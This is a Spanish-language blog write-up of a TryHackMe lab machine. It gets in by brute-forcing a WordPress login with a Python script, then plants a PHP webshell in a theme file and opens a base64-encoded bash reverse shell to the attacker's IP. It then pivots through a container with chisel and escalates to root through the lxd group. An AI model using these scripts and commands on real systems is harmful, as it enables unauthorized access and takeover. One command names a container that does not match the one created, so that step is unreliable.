---
layout: single
title: For Business Reasons - Try Hack Me
excerpt: "En esta máquina iniciamos reconociendo una página en wordpress con un usuario válido con el que podremos ingresar al panel de administración por medio de fuerza bruta consiguiendo RCE dentro de un contenedor, para luego pivotear a otra máquina por medio de un tunel con chisel y finalmente abusar del grupo lxd para conseguir el root"
date: 2021-08-24
classes: wide
header:
  teaser: /assets/images/thm-writeup-for-business-reasons/ForBusinessReasons.jpeg
  teaser_home_page: true
  icon: /assets/images/tryhackme.png
categories:
  - tryhackme
  - scripting
  - infosec
tags:
  - python scripting
  - web
  - brute force
  - pivoting
  - chisel
  - docker
---

<p align="center">
<img src="/assets/images/thm-writeup-for-business-reasons/img_header.png">
</p>

Esta es una máquina hard según la plataforma

Comenzamos con el reconocimiento inicial de la máquina con nmap

```bash
nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn [IP]
```
  - ```-p-``` -> Todo el rango de puertos (1-65535)
  - ```-sS``` -> TCP SYN/PORT scan
  - ```--min-rate``` -> Mínimo de paquetes que quiero que se emitan por segundo (5000)
  - ```--open``` -> Mostrar solo puertos abiertos
  - ```-vvv``` -> Triple verbose para ver los avances del escaneo antes de que acabe
  - ```-n``` -> Quitar la resolución DNS
  - ```-Pn``` -> Para no aplicar host discovery

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-24 10:26 -05
Initiating SYN Stealth Scan at 10:26
Scanning 10.10.95.90 [65535 ports]
Discovered open port 80/tcp on 10.10.95.90
Increasing send delay for 10.10.95.90 from 0 to 5 due to 11 out of 14 dropped probes since last increase.
Completed SYN Stealth Scan at 10:27, 27.42s elapsed (65535 total ports)
Nmap scan report for 10.10.95.90
Host is up, received user-set (0.26s latency).
Scanned at 2021-08-24 10:26:46 -05 for 27s
Not shown: 65533 filtered ports, 1 closed port
Reason: 65533 no-responses and 1 reset
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 61

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.62 seconds
           Raw packets sent: 131088 (5.768MB) | Rcvd: 13 (568B)
```
Luego de esto vemos que solo hay un puerto visible externamente, el 80 (http), así que usamos whatweb para ver contra que nos estamos enfrentando

```bash
whatweb http://[IP]
```
```bash
http://10.10.95.90 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux]
[Apache/2.4.38 (Debian)], IP[10.10.95.90], MetaGenerator[WordPress 5.4.2], PHP[7.2.34],
PoweredBy[-wordpress,-wordpress,,WordPress], Script, Title[MilkCo Test/POC site &#8211; Just another WordPress site],
UncommonHeaders[link], WordPress[5.4.2], X-Powered-By[PHP/7.2.34]
```
No vemos nada muy relevante, a parte de que es un wordpress, que se ve tal que así:

<p align="center">
<img src="/assets/images/thm-writeup-for-business-reasons/img1.png">
</p>
<p align="center">
<img src="/assets/images/thm-writeup-for-business-reasons/img2.png">
</p>

Viendo un poco la página encontramos un usuario (sysadmin), el cual se intuye que es el administrador de la página y despues de buscar por la página nos damos cuenta que solo está este usuario y no encontramos nada más de interes (a demás de los directorios default de wordpres, como el wp-login.php).

<p align="center">
<img src="/assets/images/thm-writeup-for-business-reasons/img3.png">
</p>
<p align="center">
<img src="/assets/images/thm-writeup-for-business-reasons/img4.png">
</p>

Entonces Proseguí aplicando fuerza bruta al panel de login de wordpress, se podría haber hecho con herramientas como burpsuite, pero yo preferí hacerlo con el siguiente script en python3:

```python
#!/usr/bin/python3

import signal
import requests
from pwn import *
import sys

def def_handler(signal, frame):
	print("\n[!] Exiting...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

url = "http://[IP]/wp-login.php" # <- CHANGE THIS
dictionary = open("/usr/share/wordlists/rockyou.txt", 'r')

def makeRequest():
	cookie = {'wordpress_test_cookie': 'WP+Cookie+check'}

	print("\n")
	p1 = log.progress("Password")

	for i in dictionary:
		data = {
			'log': 'sysadmin',
			'pwd': i,
			'wp-submit': 'Log+In',
			'testcookie': '1'
		}

		r = requests.post(url, data=data, cookies=cookie)
		text = r.text

		p2 = p1.status("%s" % i)

		if "incorrect" not in text:
			p1.success("%s" % i)
			break

if __name__ == '__main__':
	makeRequest()

```

Y así obtenemos la contraseña!

```bash
~$>./For_Business_Reasons-BruteForce.py
```
```bash
[+] Password: m<***CENSORED***>
```

Probamos la contraseña con el usuario (sysadmin) en el panel de login y entramos!

<p align="center">
<img src="/assets/images/thm-writeup-for-business-reasons/img5.png">
</p>
<p align="center">
<img src="/assets/images/thm-writeup-for-business-reasons/img6.png">
</p>

Una vez adentro, seguimos el procedimiento que casi simpre se hace para obtener una reverse shell modificando un tema

<p align="center">
<img src="/assets/images/thm-writeup-for-business-reasons/img7.png">
</p>

En este caso tenemos que seleccionar el tema Twenty Seventeen, ya que si intentamos modificar el que está en uso (Twenty Twenty), no vamos a poder

<p align="center">
<img src="/assets/images/thm-writeup-for-business-reasons/img8.png">
</p>

Seleccionamos la plantilla que modificaremos, en mi caso la 404.php y ponemos el código malicioso que queramos ejecutar, en mi caso obtendré una webShell con el siguiente código:

```php
echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
```
  - ```"<pre>" "</pre>"``` -> Etiquetas de preformateo (mejoran la estética del output de los comandos)
  - ```shell_exec``` -> Ejecuta el comando que reciba 'cmd'
  - ```'cmd'``` -> Parametro que recibirá los comandos
```
<p align="center">
<img src="/assets/images/thm-writeup-for-business-reasons/img9.png">
</p>

Nos dirigimos a la ruta donde se aloja el codigo que guardamos

```html
http://[IP]/wp-content/themes/twentyseventeen/404.php
```

Y por medio del parametro que posteriormente definimos (cmd) ejecutamos cualquier comando

<p align="center">
<img src="/assets/images/thm-writeup-for-business-reasons/img10.png">
</p>

Y vemos que tenemos RCE

<p align="center">
<img src="/assets/images/thm-writeup-for-business-reasons/img11.png">
</p>

Nos ponemos en escucha, en mi caso en el puerto 443, con netcat para recibir una conección

```bash
~$> nc -nlvp 443
listening on [any] 443 ...
```
Tuve algunos problemas al intentar entablar una reverse shell, pero luego de probar de varias maneras, la que me sirvió fue esta:

```bash
~$> echo "/bin/bash -c 'bash -i >& /dev/tcp/[TU_IP]/443 0>&1'" | base64
```
El output del anterior comando lo ponemos en la url

```bash
http://[IP]/wp-content/themes/twentyseventeen/404.php?cmd=echo "[OUTPUT_DEL_COMANDO_ANTERIOR]" | base64 -d | bash
```
<p align="center">
<img src="/assets/images/thm-writeup-for-business-reasons/img12.png">
</p>

Y vemos que conseguimos la shell

```bash
connect to [10.9.242.217] from (UNKNOWN) [10.10.95.90] 46454
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@3d56c33f6dd7:/var/www/html/wp-content/themes/twentyseventeen$
```
Antes de seguir upgradeamos la shell para obtener una tty full interactiva (esto nos permitira hacer ctrl_c, etc)

```bash
www-data@3d56c33f6dd7:/var/www/html/wp-content/themes/twentyseventeen$ script /dev/null -c bash
Script started, file is /dev/null
www-data@3d56c33f6dd7:/var/www/html/wp-content/themes/twentyseventeen$ ^Z
zsh: suspended  nc -nlvp 443
```
```bash
~$> stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset
reset: unknown terminal type unknown
Terminal type? xterm
```

Luego de esto seteamos las dimensiones correctas de la shell, ya que así como esta, no ocupa toda la pantalla

Vemos las dimensiones de nuestra pantalla ejecutando en una terminal normal lo siguiente:

```bash
stty -a
```
```bash
speed 38400 baud; rows 40; columns 123; line = 0;
intr = ^C; quit = ^\; erase = ^H; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q;
stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl -ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
```

Vemos en la primera linea las filas y columnas (en mi caso, rows 40, columns 123) y las seteamos en la reverse shell

```bash
www-data@3d56c33f6dd7:/var/www/html/wp-content/themes/twentyseventeen$ stty rows 40 columns 123
```
Por último exportamos las variables TERM y SHELL para que valgan xterm y bash respectivamente

```bash
www-data@3d56c33f6dd7:/var/www/html/wp-content/themes/twentyseventeen$ export TERM=xterm
www-data@3d56c33f6dd7:/var/www/html/wp-content/themes/twentyseventeen$ export SHELL=bash
```

Ahora podemos continuar con una shell más comoda

Vamos al directorio ```/var/www/html/``` y visualizamos la flag0

```bash
www-data@3d56c33f6dd7:/var/www/html/wp-content/themes/twentyseventeen$ cd /var/www/html/
www-data@3d56c33f6dd7:/var/www/html/$ ls
```
```bash
flag0.txt    lost+found   start_container.sh   wp-activate.php       wp-config.php      wp-load.php      wp-trackback.php
getip        mysql        test.sh              wp-admin              wp-content         wp-login.php     xmlrpc.php
images       note.txt     update.log           wp-blog-header.php    wp-cron.php        wp-mail.php
index.php    readme.html  update.sh            wp-comments-post.php  wp-includes        wp-settings.php
license.txt  start.log    wordpress_stack.yml  wp-config-sample.php  wp-links-opml.php  wp-signup.php
```
```bash
www-data@3d56c33f6dd7:/var/www/html/$ cat flag0.txt
y<***CENSORED***>i
```
Cambiamos de directorio a la raiz y listamos todo

```bash
www-data@3d56c33f6dd7:/var/www/html$ cd /
www-data@3d56c33f6dd7:/$ ls -la
```
```bash
total 72
drwxr-xr-x   1 root root 4096 Aug 24 15:25 .
drwxr-xr-x   1 root root 4096 Aug 24 15:25 ..
-rwxr-xr-x   1 root root    0 Aug 24 15:25 .dockerenv
drwxr-xr-x   1 root root 4096 Nov 18  2020 bin
drwxr-xr-x   2 root root 4096 Sep 19  2020 boot
drwxr-xr-x   5 root root  340 Aug 24 15:25 dev
drwxr-xr-x   1 root root 4096 Aug 24 15:25 etc
drwxr-xr-x   2 root root 4096 Sep 19  2020 home
drwxr-xr-x   1 root root 4096 Nov 18  2020 lib
drwxr-xr-x   2 root root 4096 Nov 17  2020 lib64
drwxr-xr-x   2 root root 4096 Nov 17  2020 media
drwxr-xr-x   2 root root 4096 Nov 17  2020 mnt
drwxr-xr-x   2 root root 4096 Nov 17  2020 opt
dr-xr-xr-x 155 root root    0 Aug 24 15:25 proc
drwx------   1 root root 4096 Nov 18  2020 root
drwxr-xr-x   1 root root 4096 Nov 18  2020 run
drwxr-xr-x   1 root root 4096 Nov 18  2020 sbin
drwxr-xr-x   2 root root 4096 Nov 17  2020 srv
dr-xr-xr-x  13 root root    0 Aug 24 15:25 sys
drwxrwxrwt   1 root root 4096 Aug 24 15:25 tmp
drwxr-xr-x   1 root root 4096 Nov 17  2020 usr
drwxr-xr-x   1 root root 4096 Nov 18  2020 var
```
Aquí podemos ver un fichero ```.dockerenv```, con lo que sabemos que estamos en un contenedor
Vemos la IP de nuestro equipo

```bash
www-data@3d56c33f6dd7:/$ hostname -I
10.255.0.4 172.18.0.3 10.0.0.3
```
Luego de esto ejecuto este comando para ver en que IPs de la red se encuentra activo el puerto 22(ssh)

```bash
www-data@3d56c33f6dd7:/$ for i in $(seq 1 24); do timeout 1 bash -c "echo "" > /dev/tcp/172.18.0.$i/22" 2>/dev/null && echo -e "\n[+] Host [172.18.0.$i] with port [22]\n"; done
```
Obteniendo lo siguiente:

```bash
[+] Host [172.18.0.1] with port [22]
```
El único host con el puerto 22 abierto es el equipo local (127.0.0.1:22), por lo que ahora usaremos chisel para efectuar un Remote Port Forwarding

Iniciamos un servicio http en nuestra máquina de atacante en la ruta donde tenemos chisel

```bash
~$> python3 -m http.server 80
```
Seguido de esto nos descargamos chisel en la máquina víctima, dentro del directorio ```/tmp```,  haciendo una petición a nuestra máquina con curl

```bash
www-data@3d56c33f6dd7:/$ cd /tmp
www-data@3d56c33f6dd7:/tmp$ curl http://[TU_IP]/chisel -o chisel
```
```bash
www-data@3d56c33f6dd7:/tmp$ curl http://10.9.242.217/chisel -o chisel
```
```bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 8144k  100 8144k    0     0  91654      0  0:01:30  0:01:30 --:--:--  109k
```
Le otorgamos permisos de ejecución

```bash
www-data@3d56c33f6dd7:/tmp$ chmod +x chisel
```
Lo ejecutamos en nuestra máquina:

```bash
~$>./chisel server --reverse -p 6789
```
```bash
2021/08/24 13:28:00 server: Reverse tunnelling enabled
2021/08/24 13:28:00 server: Fingerprint YJAb4PvHPP98LLMeCwzvdvHPQPBcWWibsBY/eFUy4H0=
2021/08/24 13:28:00 server: Listening on http://0.0.0.0:6789
```
Y luego en la máquina víctima:

```bash
www-data@3d56c33f6dd7:/tmp$ ./chisel client 10.9.242.217:6789 R:2222:172.18.0.1:22
2021/08/24 18:28:43 client: Connecting to ws://10.9.242.217:6789
2021/08/24 18:28:44 client: Connected (Latency 192.044629ms)
```
Comprobamos que el puerto 2222 esté activo en nuestra máquina

```bash
~$> lsof -i:2222
```
```bash
COMMAND    PID         USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
chisel  214968 invertebrado    8u  IPv6 471556      0t0  TCP *:2222 (LISTEN)
```
De esta manera ya podemos conectarnos por ssh a la máquina víctima desde nuestra máquina usando las mismas credenciales que usamos al principio

```bash
~$> ssh sysadmin@127.0.0.1 -p 2222
```
```bash
The authenticity of host '[127.0.0.1]:2222 ([127.0.0.1]:2222)' can't be established.
ECDSA key fingerprint is SHA256:YWh6/YCN0RzHZZK5fdUZ2EB9I2CQSoW4XAZ5/V+CYUc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:2222' (ECDSA) to the list of known hosts.
sysadmin@127.0.0.1's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

263 packages can be updated.
181 updates are security updates.


Last login: Sat Nov 21 15:30:19 2020
sysadmin@ubuntu:~$ whoami
sysadmin
```

Logramos Entrar como el usuario sysadmin y podemos leer la flag1

```bash
sysadmin@ubuntu:~$ ls
flag1.txt
```
```bash
sysadmin@ubuntu:~$ cat flag1.txt
o<***CENSORED***>i
```

Para la última flag debemos de abusar del grupo lxd en el que está el usuario sysadmin

```bash
sysadmin@ubuntu:~$ id
```
```bash
uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
122(docker)
```
Para esto nos clonamos el siguiente repositorio en nuestra máquina, que nos permitirá escalar privilegios

```bash
~$> git clone https://github.com/saghul/lxd-alpine-builder.git
```
```bash
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 35, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 35 (delta 2), reused 2 (delta 0), pack-reused 27
Receiving objects: 100% (35/35), 21.69 KiB | 264.00 KiB/s, done.
Resolving deltas: 100% (8/8), done.
```
```bash
~$> cd lxd-alpine-builder
~$> sudo ./build-alpine
```
Iniciamos un servidor http con python3

```bash
~$> python3 -m http.server 80
```
Y esto en la máquina víctima:
```bash
sysadmin@ubuntu:~$ wget http://10.9.242.217/alpine-v3.14-x86_64-20210824_1357.tar.gz
```
```bash
sysadmin@ubuntu:~$ lxc image import ./alpine-v3.14-x86_64-20210824_1357.tar.gz --alias pwned
Image imported with fingerprint: 1b618f2f54435ff6cd80a76e25d0f5070d4ebf16d7f730a0ea850164bd99655f
```
Listamos las imagenes existentes

```bash
sysadmin@ubuntu:~$ lxc image list
```
```bash
+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| pwned | 1b618f2f5443 | no     | alpine v3.14 (20210824_13:57) | x86_64 | 3.11MB | Aug 24, 2021 at 7:05pm (UTC) |
+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+
```
Ahí vemos la que acabamos de crear (pwned)

Y finalmente ejecutamos lo siguiente:

```bash
sysadmin@ubuntu:~$ lxc init pwned invertebrado -c security.privileged=true
Creating invertebrado
```
```bash
sysadmin@ubuntu:~$ lxc config device add invertebrado miequipo disk source=/ path=/mnt/root recursive=true
Device miequipo added to invertebrado
```
Iniciamos el contenedor (en mi caso invertebrado)

```bash
sysadmin@ubuntu:~$ lxc start invertebrado
```
Y por último
```bash
sysadmin@ubuntu:~$ lxc exec sckull /bin/sh
~ #
```
Ya somos root!
```bash
~ # whoami
root
```
Podemos leer la flag dentro de ```/mnt/root/root/```

```bash
~ # cat /mnt/root/root/root.txt
K<***CENSORED***>j
```
